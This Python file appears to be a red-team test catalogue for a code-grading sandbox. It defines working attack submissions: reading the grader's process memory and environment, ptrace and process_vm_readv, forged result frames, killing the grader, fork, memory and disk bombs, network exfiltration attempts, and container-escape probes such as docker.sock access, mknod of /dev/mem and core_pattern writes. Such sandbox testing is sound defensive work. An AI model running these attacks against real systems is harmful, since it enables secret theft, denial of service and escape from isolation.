"""Adversarial submissions for ALI-62. Each is a learner submission run ONLY inside the sandbox.

Every `sort-list` attack ends with a deliberately WRONG `my_sort` (returns the list unsorted), so a
`passed` verdict can only mean the attack forged a pass. Each attack also computes ONE decisive
`OBS <key>=<bool>` the driver asserts on (e.g. `leaked`, `escaped`, `wrote`, `killed`); the dicts of
raw per-probe results are printed too, for the record. `attacks/manifest.json` is generated from
ATTACKS by `python3 -I attacks/catalog.py`."""
import json
import pathlib

WRONG = "\ndef my_sort(xs):\n    return xs      # deliberately wrong: a pass here is a forged pass\n"

PRELUDE = r'''
import ctypes, errno, os, sys
def _e(n):
    return errno.errorcode.get(n, n)
def _err(e):
    return errno.errorcode.get(getattr(e, "errno", 0), type(e).__name__)
def grader_pid():
    # Identify the grader by its command line (robust whether it runs as uid 10001 (secure) or
    # the learner's own uid (same-uid control)); fall back to a distinct uid 10001.
    me = os.getpid()
    fallback = None
    for d in os.listdir("/proc"):
        if not d.isdigit() or int(d) in (me, 1):
            continue
        try:
            if b"grader_harness" in open("/proc/%s/cmdline" % d, "rb").read():
                return int(d)
            st = open("/proc/%s/status" % d).read()
        except OSError:
            continue
        uid = next((ln.split()[1] for ln in st.splitlines() if ln.startswith("Uid:")), None)
        if uid == "10001":
            fallback = int(d)
    return fallback
# Secret fragments assembled at runtime so THIS source never contains the contiguous secret.
NEEDLES = [b"HODOS-" + b"CANARY-7a3f9c2e1b8d4056", b"ANSWER-" + b"KEY-sort-list-6f1e8a9c0d2b3e47"]
def has_needle(b):
    return any(n in b for n in NEEDLES)
LIBC = ctypes.CDLL(None, use_errno=True)
def eprint(m, flush=True):
    sys.stderr.write(m + "\n")
    if flush:
        sys.stderr.flush()
'''

ATTACKS = []


def add(id, category, desc, body, secure, control=False, exercise="sort-list", mode="submit"):
    src = PRELUDE + body + (WRONG if exercise == "sort-list" else "")
    ATTACKS.append({"id": id, "category": category, "desc": desc, "submission": src,
                    "exercise": exercise, "mode": mode, "secure": secure, "control": control})


# ---------------------------------------------------------------- READ the hidden tests / nonce
add("read-proc-grader", "read", "read the grader's /proc/{environ,mem,maps,fd,cmdline}", r'''
g = grader_pid()
res, leaked = {}, False
if g:
    for f in ("environ", "mem", "maps", "fd", "cmdline"):
        p = "/proc/%d/%s" % (g, f)
        try:
            data = b"".join(x.encode() for x in os.listdir(p)) if f == "fd" else open(p, "rb").read()
            res[f] = "LEAK" if has_needle(data) else "READ:%d" % len(data)
            leaked = leaked or has_needle(data)
        except OSError as e:
            res[f] = _err(e)
eprint("OBS grader_pid=%s grader_access=%r" % (g, res))
eprint("OBS leaked=%s" % leaked)
''', secure={"not_passed": True, "no_leak": True, "obs": {"leaked": "False"}}, control=True)

add("read-fs-walk", "read", "walk the filesystem for the hidden-test canary / answer key", r'''
hits = []
for root in ("/work", "/opt", "/tmp", "/dev/shm", "/etc", "/usr/local"):
    for dp, _, fs in os.walk(root):
        for fn in fs:
            p = os.path.join(dp, fn)
            if p == "/work/submission.py":
                continue
            try:
                if has_needle(open(p, "rb").read()):
                    hits.append(p)
            except OSError:
                pass
eprint("OBS fs_canary_hits=%r" % hits)
eprint("OBS leaked=%s" % bool(hits))
''', secure={"not_passed": True, "no_leak": True, "obs": {"leaked": "False"}}, control=True)

add("read-ptrace", "read", "PTRACE_ATTACH the grader and pid 1", r'''
g = grader_pid()
res, attached = {}, False
for tgt in (g, 1):
    if not tgt:
        continue
    r = LIBC.ptrace(16, tgt, 0, 0)   # PTRACE_ATTACH
    if r == 0:
        res[tgt] = "ATTACHED"; attached = True
    else:
        res[tgt] = _e(ctypes.get_errno())
eprint("OBS ptrace=%r" % res)
eprint("OBS attached=%s" % attached)
''', secure={"not_passed": True, "no_leak": True, "obs": {"attached": "False"}}, control=False)

add("read-vm-readv", "read", "process_vm_readv the grader's memory", r'''
g = grader_pid()
ok = False
if g:
    buf = (ctypes.c_char * 4096)()
    class IOV(ctypes.Structure):
        _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]
    liov = IOV(ctypes.cast(buf, ctypes.c_void_p), 4096)
    riov = IOV(ctypes.c_void_p(0x400000), 4096)
    n = LIBC.process_vm_readv(g, ctypes.byref(liov), 1, ctypes.byref(riov), 1, 0)
    ok = n >= 0
    eprint("OBS vm_readv=%s" % ("READ:%d" % n if ok else _e(ctypes.get_errno())))
eprint("OBS read_ok=%s" % ok)
''', secure={"not_passed": True, "no_leak": True, "obs": {"read_ok": "False"}}, control=False)

add("read-env", "read", "dump own env and /proc/1/environ for the nonce", r'''
own = dict(os.environ)
init_leak = False
try:
    init_leak = b"ALI40_NONCE" in open("/proc/1/environ", "rb").read()
    init = "READ"
except OSError as e:
    init = _err(e)
leak = ("ALI40_NONCE" in own) or init_leak
eprint("OBS own_env_keys=%r init_env=%s" % (sorted(own), init))
eprint("OBS env_leak=%s" % leak)
''', secure={"not_passed": True, "no_leak": True, "obs": {"env_leak": "False"}}, control=True)

add("read-inherited-fds", "read", "read inherited fds 0..255 for the result pipe / socket contents", r'''
leak = []
for fd in range(256):
    try:
        os.lseek(fd, 0, os.SEEK_SET)
        if has_needle(os.read(fd, 65536)):
            leak.append(fd)
    except OSError:
        pass
eprint("OBS fd_leak=%r" % leak)
eprint("OBS leaked=%s" % bool(leak))
''', secure={"not_passed": True, "no_leak": True, "obs": {"leaked": "False"}}, control=False)

add("read-ipc", "read", "scan /dev/shm, /proc/net/unix and sysv IPC", r'''
leak = False
try:
    shm = os.listdir("/dev/shm")
except OSError as e:
    shm = _err(e)
try:
    leak = has_needle(open("/proc/net/unix", "rb").read())
except OSError:
    pass
eprint("OBS shm=%r" % shm)
eprint("OBS leaked=%s" % leak)
''', secure={"not_passed": True, "no_leak": True, "obs": {"leaked": "False"}}, control=False)

# ---------------------------------------------------------------- KILL / signal the grader
add("kill-grader", "kill", "SIGKILL/SIGSTOP/SIGTERM the grader", r'''
import signal
g = grader_pid()
res, killed = {}, False
if g:
    for sig in (signal.SIGKILL, signal.SIGSTOP, signal.SIGTERM):
        try:
            os.kill(g, sig); res[int(sig)] = "SENT"; killed = True
        except OSError as e:
            res[int(sig)] = _err(e)
eprint("OBS kill_grader=%r" % res)
eprint("OBS killed=%s" % killed)
''', secure={"not_passed": True, "no_leak": True, "obs": {"killed": "False"}}, control=True)

add("kill-supervisor", "kill", "signal pid 1 (the supervisor) with SIGKILL/SIGTERM/SIGSTOP", r'''
import signal
res, sent = {}, False
for sig in (signal.SIGKILL, signal.SIGTERM, signal.SIGSTOP):
    try:
        os.kill(1, sig); res[int(sig)] = "SENT"; sent = True
    except OSError as e:
        res[int(sig)] = _err(e)
eprint("OBS kill_init=%r" % res)
eprint("OBS sent=%s" % sent)
''', secure={"not_passed": True, "no_leak": True, "obs": {"sent": "False"}}, control=False)

# ---------------------------------------------------------------- FORGE the result channel
add("forge-stdout-frame", "forge", "print a fake ALI40-RESULT pass frame on stdout (x50)", r'''
import json
fake = {"v": 1, "nonce": "0" * 32, "kind": "call",
        "grader": {"exit": 0, "result": {"nonce": "0" * 32, "done": True,
                   "results": [{"name": "t", "ok": True, "why": ""}]}},
        "learner": {"exit": 0, "reason": None, "stdout": "", "stderr": "",
                    "stdout_bytes": 0, "stderr_bytes": 0, "truncated": False}}
for _ in range(50):
    print("ALI40-RESULT " + json.dumps(fake), flush=True)
''', secure={"not_passed": True, "no_leak": True}, control=True)

add("forge-write-fds", "forge", "open /proc/1/fd/1, /dev/stdout and grader fds, write a fake frame", r'''
import json
g = grader_pid()
fake = b"ALI40-RESULT " + json.dumps({"v": 1, "nonce": "0" * 32}).encode() + b"\n"
targets = ["/proc/1/fd/1", "/proc/1/fd/0", "/dev/stdout", "/dev/fd/1"]
if g:
    targets += ["/proc/%d/fd/%d" % (g, n) for n in range(3, 8)]
res, wrote = {}, False
for t in targets:
    try:
        fd = os.open(t, os.O_WRONLY); os.write(fd, fake); os.close(fd); res[t] = "WROTE"; wrote = True
    except OSError as e:
        res[t] = _err(e)
eprint("OBS write_fds=%r" % res)
eprint("OBS wrote=%s" % wrote)
''', secure={"not_passed": True, "no_leak": True, "obs": {"wrote": "False"}}, control=False)

add("forge-early-exit", "forge", "exit 0 before any test runs", "import os\nos._exit(0)\n",
    secure={"not_passed": True, "no_leak": True}, control=True)

add("forge-colocated-pass", "forge", "read the nonce + hidden test names, print a fully valid forged pass frame, exit before the grader runs", r'''
import json
nonce = os.environ.get("ALI40_NONCE", "")                 # present only when isolation is absent
names = []
try:
    src = open("/work/hidden_tests.py").read()            # present only when isolation is absent
    names = [ln.split("(")[0].split()[1] for ln in src.splitlines() if ln.strip().startswith("def test_")]
except OSError:
    pass
results = [{"name": n, "ok": True, "why": ""} for n in names]
frame = {"v": 1, "nonce": nonce, "kind": "call",
         "grader": {"exit": 0, "result": {"nonce": nonce, "results": results, "done": True}},
         "learner": {"exit": 0, "reason": None, "stdout": "", "stderr": "",
                     "stdout_bytes": 0, "stderr_bytes": 0, "truncated": False}}
print("ALI40-RESULT " + json.dumps(frame), flush=True)    # real channel ONLY in colocated
os._exit(0)
''', secure={"not_passed": True, "no_leak": True}, control=True)

add("steal-nonce", "forge", "steal the per-run nonce from own env / grader env / grader mem", r'''
found = None
if "ALI40_NONCE" in os.environ:                          # colocated puts it in our own env
    found = "own_env"
g = grader_pid()
if not found and g:
    try:
        if b"ALI40_NONCE" in open("/proc/%d/environ" % g, "rb").read():   # same-uid: grader env
            found = "grader_env"
    except OSError:
        pass
    if not found:
        try:
            open("/proc/%d/mem" % g, "rb").read(1)        # same-uid: grader memory
            found = "grader_mem"
        except OSError:
            pass
eprint("OBS nonce_source=%s" % found)
eprint("OBS nonce_found=%s" % bool(found))
''', secure={"not_passed": True, "no_leak": True, "obs": {"nonce_found": "False"}}, control=True)

add("forge-socket-protocol", "forge", "grab the RPC socket fd and send junk / oversize / wrong-id / never reply", r'''
import socket, struct, json, time
fd = int(sys.argv[1])
try:
    s = socket.socket(fileno=os.dup(fd))
    s.sendall(b"not-a-frame-at-all")
    s.sendall(struct.pack(">I", 10) + b"short")
    huge = json.dumps({"id": 999, "result": [0] * 50000}).encode()
    s.sendall(struct.pack(">I", len(huge)) + huge)
    s.sendall(struct.pack(">I", 0xFFFFFFFF))
    eprint("OBS socket_abuse=sent", flush=True)
except OSError as e:
    eprint("OBS socket_abuse=%s" % _err(e), flush=True)
time.sleep(60)
''', secure={"not_passed": True, "no_leak": True}, control=False),

add("forge-lying-return", "forge", "return NaN / lying __eq__ across the RPC boundary", r'''
class Yes(list):
    def __eq__(self, o):
        return True
def my_sort(xs):
    if len(xs) == 0:
        return []
    return float("nan")      # allow_nan=False -> protocol error -> test fails, never a pass
''', secure={"not_passed": True, "no_leak": True}, control=False),

add("forge-monkeypatch", "forge", "monkeypatch json/sys.modules/the learner harness", r'''
import json as _json, sys as _sys
try:
    _json.dumps = lambda *a, **k: '{"id": 1, "result": []}'
except Exception as e:
    eprint("OBS patch=%s" % type(e).__name__)
_sys.modules["grader_harness"] = None   # grader is a SEPARATE process; no effect
eprint("OBS monkeypatch=applied")
''', secure={"not_passed": True, "no_leak": True}, control=False),

# ---------------------------------------------------------------- DoS
add("dos-fork-bomb", "dos", "unbounded fork bomb", r'''
eprint("OBS forkbomb=start", flush=True)
while True:
    try:
        os.fork()
    except OSError:
        pass
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

add("dos-thread-bomb", "dos", "unbounded thread creation", r'''
import threading, time
n = 0
try:
    while True:
        threading.Thread(target=lambda: time.sleep(60)).start(); n += 1
except RuntimeError:
    eprint("OBS threads=%d" % n)
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

add("dos-disk-fill", "dos", "fill the /work tmpfs", r'''
written = 0
try:
    with open("/work/fill.bin", "wb") as fh:
        while True:
            fh.write(b"A" * (1 << 20)); fh.flush(); written += 1
except OSError as e:
    eprint("OBS disk=%s written_mib=%d" % (_err(e), written))
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

add("dos-mem-bomb", "dos", "allocate until OOM", r'''
blocks = []
try:
    while True:
        blocks.append(bytearray(16 << 20))
except MemoryError:
    eprint("OBS mem=MemoryError")
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

add("dos-cpu-spin", "dos", "infinite CPU loop (wall-time cap)", r'''
eprint("OBS spin=start", flush=True)
while True:
    pass
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

add("dos-output-flood", "dos", "flood stdout", r'''
eprint("OBS flood=start", flush=True)
while True:
    sys.stdout.write("X" * 65536)
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

add("dos-import-hang", "dos", "hang during import (before my_sort is defined)", r'''
import time
eprint("OBS hang=start", flush=True)
time.sleep(300)
''', secure={"not_passed": True, "no_leak": True, "no_leftovers": True}, control=False),

# ---------------------------------------------------------------- NETWORK
add("net-exfil", "network", "TCP/UDP/DNS/raw to loopback canary and public IPs", r'''
import socket
res, ok = {}, False
for name, fn in [
    ("tcp_loop", lambda: socket.create_connection(("127.0.0.1", 18741), timeout=1)),
    ("tcp_public", lambda: socket.create_connection(("1.1.1.1", 53), timeout=1)),
    ("dns", lambda: socket.getaddrinfo("example.com", 80)),
    ("raw", lambda: socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)),
]:
    try:
        fn(); res[name] = "OK"; ok = True
    except OSError as e:
        res[name] = _err(e)
eprint("OBS net=%r" % res)
eprint("OBS net_ok=%s" % ok)
''', secure={"not_passed": True, "no_leak": True, "obs": {"net_ok": "False"}}, control=False),

# ---------------------------------------------------------------- ESCAPE
add("escape-sockets", "escape", "open host container-engine sockets / pid1 root", r'''
res, exists = {}, False
for p in ("/var/run/docker.sock", "/run/podman/podman.sock",
          "/run/user/1000/podman/podman.sock", "/proc/1/root/etc/hostname"):
    try:
        os.stat(p); res[p] = "EXISTS"; exists = True
    except OSError as e:
        res[p] = _err(e)
eprint("OBS sockets=%r" % res)
eprint("OBS sockets_exist=%s" % exists)
''', secure={"not_passed": True, "no_leak": True, "obs": {"sockets_exist": "False"}}, control=False),

add("escape-privs", "escape", "setuid(0), chroot, usable device via mknod, unshare(NEWUSER)", r'''
res, escaped = {}, False
try:
    os.setuid(0); res["setuid0"] = "uid=%d" % os.getuid(); escaped = escaped or os.getuid() == 0
except OSError as e:
    res["setuid0"] = _err(e)
try:
    os.chroot("/work"); res["chroot"] = "OK"; escaped = True
except OSError as e:
    res["chroot"] = _err(e)
# mknod of a char device may succeed on this kernel's tmpfs, but /work is mounted nodev,noexec,nosuid
# so the node is INERT: a real escape needs to actually read host memory THROUGH it.
try:
    os.mknod("/work/mem", 0o600 | 0o020000, os.makedev(1, 1))   # c 1 1 = /dev/mem
    res["mknod"] = "created"
    try:
        fd = os.open("/work/mem", os.O_RDONLY); os.read(fd, 16); os.close(fd)
        res["mem_read"] = "USABLE"; escaped = True        # only THIS would be an escape
    except OSError as e:
        res["mem_read"] = _err(e)                          # nodev -> inert node
except OSError as e:
    res["mknod"] = _err(e)
# unshare(CLONE_NEWUSER) is allowed for unprivileged users and is NOT an escape (empty nested userns,
# no new privileges thanks to no_new_privs); recorded but not counted as a breach.
res["unshare_newuser"] = "OK" if LIBC.unshare(0x10000000) == 0 else _e(ctypes.get_errno())
eprint("OBS escape_privs=%r" % res)
eprint("OBS escaped=%s" % escaped)
''', secure={"not_passed": True, "no_leak": True, "obs": {"escaped": "False"}}, control=False),

add("escape-cgroup-proc", "escape", "write cgroup / /proc/sys / core_pattern / sysrq / self mem", r'''
res, wrote = {}, False
for p, data in (("/sys/fs/cgroup/cgroup.procs", "1"), ("/sys/fs/cgroup/memory.max", "max"),
                ("/proc/sys/kernel/core_pattern", "|/x"), ("/proc/sysrq-trigger", "c"),
                ("/proc/self/mem", "x")):
    try:
        fd = os.open(p, os.O_WRONLY); os.write(fd, data.encode()); os.close(fd); res[p] = "WROTE"; wrote = True
    except OSError as e:
        res[p] = _err(e)
eprint("OBS escape_write=%r" % res)
eprint("OBS wrote=%s" % wrote)
''', secure={"not_passed": True, "no_leak": True, "obs": {"wrote": "False"}}, control=False),


def main():
    out = {"count": len(ATTACKS),
           "attacks": [{k: a[k] for k in ("id", "category", "desc", "exercise", "mode", "control")}
                       for a in ATTACKS]}
    path = pathlib.Path(__file__).resolve().parent / "manifest.json"
    path.write_text(json.dumps(out, indent=1) + "\n")
    by_cat = {}
    for a in ATTACKS:
        by_cat[a["category"]] = by_cat.get(a["category"], 0) + 1
    print(f"wrote {path} ({len(ATTACKS)} attacks) by category: {by_cat}")


if __name__ == "__main__":
    main()
